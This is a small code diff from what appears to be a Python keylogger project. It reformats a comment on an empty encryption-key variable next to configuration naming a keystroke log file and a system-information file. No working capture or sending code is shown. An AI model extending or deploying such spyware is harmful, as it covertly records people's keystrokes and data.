@@ -45,7 +45,7 @@ import logging
 file_path = ' '   # The file path where you want your files to be save locally 
 extend = "\\"
 file_merge = file_path + extend
-key = " "  # # Generate an encryption key from the Cryptography folder 
+key = " "         # Generate an encryption key from the Cryptography folder 
 
 keys_information =  "key_log.txt"                  #Stored Keylog Files
 system_information = "systeminfo.txt"              #Stored System info Files
